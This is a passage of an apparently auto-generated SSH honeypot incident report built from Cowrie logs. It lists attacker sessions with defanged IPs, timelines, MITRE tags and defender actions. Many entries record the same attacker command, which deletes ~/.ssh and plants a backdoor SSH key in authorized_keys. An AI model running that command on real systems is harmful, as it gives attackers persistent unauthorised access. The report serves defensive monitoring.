| `2026-04-14 17:26:46` | `cowrie.client.version` |
| `2026-04-14 17:26:46` | `cowrie.client.kex` |
| `2026-04-14 17:26:47` | `cowrie.login.success` |
| `2026-04-14 17:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4e770817e6

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:27 |
| **Last Seen** | 2026-04-14 17:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:27:45` | `cowrie.session.connect` |
| `2026-04-14 17:27:45` | `cowrie.client.version` |
| `2026-04-14 17:27:45` | `cowrie.client.kex` |
| `2026-04-14 17:27:46` | `cowrie.login.success` |
| `2026-04-14 17:27:46` | `cowrie.session.params` |
| `2026-04-14 17:27:46` | `cowrie.command.input` |
| `2026-04-14 17:27:46` | `cowrie.command.failed` |
| `2026-04-14 17:27:46` | `cowrie.log.closed` |
| `2026-04-14 17:27:47` | `cowrie.session.params` |
| `2026-04-14 17:27:47` | `cowrie.command.input` |
| `2026-04-14 17:27:47` | `cowrie.session.file_download` |
| `2026-04-14 17:27:47` | `cowrie.log.closed` |
| `2026-04-14 17:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0f8a6ad035

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:27 |
| **Last Seen** | 2026-04-14 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:27:49` | `cowrie.session.connect` |
| `2026-04-14 17:27:49` | `cowrie.client.version` |
| `2026-04-14 17:27:49` | `cowrie.client.kex` |
| `2026-04-14 17:27:50` | `cowrie.login.success` |
| `2026-04-14 17:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a45f481458

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:27 |
| **Last Seen** | 2026-04-14 17:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:27:54` | `cowrie.session.connect` |
| `2026-04-14 17:27:54` | `cowrie.client.version` |
| `2026-04-14 17:27:54` | `cowrie.client.kex` |
| `2026-04-14 17:27:55` | `cowrie.login.success` |
| `2026-04-14 17:27:55` | `cowrie.session.params` |
| `2026-04-14 17:27:55` | `cowrie.command.input` |
| `2026-04-14 17:27:55` | `cowrie.command.failed` |
| `2026-04-14 17:27:55` | `cowrie.log.closed` |
| `2026-04-14 17:27:55` | `cowrie.session.params` |
| `2026-04-14 17:27:55` | `cowrie.command.input` |
| `2026-04-14 17:27:55` | `cowrie.session.file_download` |
| `2026-04-14 17:27:55` | `cowrie.log.closed` |
| `2026-04-14 17:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82c8ef1fec9

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:27 |
| **Last Seen** | 2026-04-14 17:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:27:57` | `cowrie.session.connect` |
| `2026-04-14 17:27:57` | `cowrie.client.version` |
| `2026-04-14 17:27:57` | `cowrie.client.kex` |
| `2026-04-14 17:27:58` | `cowrie.login.success` |
| `2026-04-14 17:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c791f0bf06

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:28 |
| **Last Seen** | 2026-04-14 17:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:28:03` | `cowrie.session.connect` |
| `2026-04-14 17:28:03` | `cowrie.client.version` |
| `2026-04-14 17:28:03` | `cowrie.client.kex` |
| `2026-04-14 17:28:04` | `cowrie.login.success` |
| `2026-04-14 17:28:04` | `cowrie.session.params` |
| `2026-04-14 17:28:04` | `cowrie.command.input` |
| `2026-04-14 17:28:04` | `cowrie.command.failed` |
| `2026-04-14 17:28:04` | `cowrie.log.closed` |
| `2026-04-14 17:28:04` | `cowrie.session.params` |
| `2026-04-14 17:28:04` | `cowrie.command.input` |
| `2026-04-14 17:28:04` | `cowrie.session.file_download` |
| `2026-04-14 17:28:04` | `cowrie.log.closed` |
| `2026-04-14 17:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cbd9f5e8b11

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:28 |
| **Last Seen** | 2026-04-14 17:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:28:06` | `cowrie.session.connect` |
| `2026-04-14 17:28:06` | `cowrie.client.version` |
| `2026-04-14 17:28:06` | `cowrie.client.kex` |
| `2026-04-14 17:28:07` | `cowrie.login.success` |
| `2026-04-14 17:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8ca7276e83

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:28 |
| **Last Seen** | 2026-04-14 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:28:25` | `cowrie.session.connect` |
| `2026-04-14 17:28:25` | `cowrie.client.version` |
| `2026-04-14 17:28:25` | `cowrie.client.kex` |
| `2026-04-14 17:28:27` | `cowrie.login.success` |
| `2026-04-14 17:28:27` | `cowrie.session.params` |
| `2026-04-14 17:28:27` | `cowrie.command.input` |
| `2026-04-14 17:28:27` | `cowrie.command.failed` |
| `2026-04-14 17:28:28` | `cowrie.log.closed` |
| `2026-04-14 17:28:28` | `cowrie.session.params` |
| `2026-04-14 17:28:28` | `cowrie.command.input` |
| `2026-04-14 17:28:29` | `cowrie.session.file_download` |
| `2026-04-14 17:28:29` | `cowrie.log.closed` |
| `2026-04-14 17:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02adaef2bea

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:28 |
| **Last Seen** | 2026-04-14 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:28:32` | `cowrie.session.connect` |
| `2026-04-14 17:28:32` | `cowrie.client.version` |
| `2026-04-14 17:28:32` | `cowrie.client.kex` |
| `2026-04-14 17:28:34` | `cowrie.login.success` |
| `2026-04-14 17:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ae1eb9a9ac

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:18` | `cowrie.session.connect` |
| `2026-04-14 17:29:18` | `cowrie.client.version` |
| `2026-04-14 17:29:18` | `cowrie.client.kex` |
| `2026-04-14 17:29:19` | `cowrie.login.success` |
| `2026-04-14 17:29:20` | `cowrie.session.params` |
| `2026-04-14 17:29:20` | `cowrie.command.input` |
| `2026-04-14 17:29:20` | `cowrie.command.failed` |
| `2026-04-14 17:29:20` | `cowrie.log.closed` |
| `2026-04-14 17:29:20` | `cowrie.session.params` |
| `2026-04-14 17:29:20` | `cowrie.command.input` |
| `2026-04-14 17:29:21` | `cowrie.session.file_download` |
| `2026-04-14 17:29:21` | `cowrie.log.closed` |
| `2026-04-14 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f1f8f13805

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:24` | `cowrie.session.connect` |
| `2026-04-14 17:29:24` | `cowrie.client.version` |
| `2026-04-14 17:29:24` | `cowrie.client.kex` |
| `2026-04-14 17:29:25` | `cowrie.login.success` |
| `2026-04-14 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a188929591b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:25` | `cowrie.session.connect` |
| `2026-04-14 17:29:25` | `cowrie.client.version` |
| `2026-04-14 17:29:25` | `cowrie.client.kex` |
| `2026-04-14 17:29:26` | `cowrie.login.success` |
| `2026-04-14 17:29:26` | `cowrie.session.params` |
| `2026-04-14 17:29:26` | `cowrie.command.input` |
| `2026-04-14 17:29:26` | `cowrie.command.failed` |
| `2026-04-14 17:29:26` | `cowrie.log.closed` |
| `2026-04-14 17:29:26` | `cowrie.session.params` |
| `2026-04-14 17:29:26` | `cowrie.command.input` |
| `2026-04-14 17:29:26` | `cowrie.session.file_download` |
| `2026-04-14 17:29:26` | `cowrie.log.closed` |
| `2026-04-14 17:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7608bb6c2419

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:28` | `cowrie.session.connect` |
| `2026-04-14 17:29:28` | `cowrie.client.version` |
| `2026-04-14 17:29:28` | `cowrie.client.kex` |
| `2026-04-14 17:29:29` | `cowrie.login.success` |
| `2026-04-14 17:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0df9e800b40

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:40` | `cowrie.session.connect` |
| `2026-04-14 17:29:40` | `cowrie.client.version` |
| `2026-04-14 17:29:40` | `cowrie.client.kex` |
| `2026-04-14 17:29:40` | `cowrie.login.success` |
| `2026-04-14 17:29:41` | `cowrie.session.params` |
| `2026-04-14 17:29:41` | `cowrie.command.input` |
| `2026-04-14 17:29:41` | `cowrie.command.failed` |
| `2026-04-14 17:29:41` | `cowrie.log.closed` |
| `2026-04-14 17:29:41` | `cowrie.session.params` |
| `2026-04-14 17:29:41` | `cowrie.command.input` |
| `2026-04-14 17:29:41` | `cowrie.session.file_download` |
| `2026-04-14 17:29:41` | `cowrie.log.closed` |
| `2026-04-14 17:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1218592c1b1

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:29 |
| **Last Seen** | 2026-04-14 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:29:43` | `cowrie.session.connect` |
| `2026-04-14 17:29:43` | `cowrie.client.version` |
| `2026-04-14 17:29:43` | `cowrie.client.kex` |
| `2026-04-14 17:29:43` | `cowrie.login.success` |
| `2026-04-14 17:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf896780d94

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:30 |
| **Last Seen** | 2026-04-14 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:30:07` | `cowrie.session.connect` |
| `2026-04-14 17:30:07` | `cowrie.client.version` |
| `2026-04-14 17:30:07` | `cowrie.client.kex` |
| `2026-04-14 17:30:09` | `cowrie.login.success` |
| `2026-04-14 17:30:09` | `cowrie.session.params` |
| `2026-04-14 17:30:09` | `cowrie.command.input` |
| `2026-04-14 17:30:09` | `cowrie.command.failed` |
| `2026-04-14 17:30:10` | `cowrie.log.closed` |
| `2026-04-14 17:30:10` | `cowrie.session.params` |
| `2026-04-14 17:30:10` | `cowrie.command.input` |
| `2026-04-14 17:30:11` | `cowrie.session.file_download` |
| `2026-04-14 17:30:11` | `cowrie.log.closed` |
| `2026-04-14 17:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89136545b479

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:30 |
| **Last Seen** | 2026-04-14 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:30:14` | `cowrie.session.connect` |
| `2026-04-14 17:30:14` | `cowrie.client.version` |
| `2026-04-14 17:30:14` | `cowrie.client.kex` |
| `2026-04-14 17:30:16` | `cowrie.login.success` |
| `2026-04-14 17:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1289701dac

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:31 |
| **Last Seen** | 2026-04-14 17:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
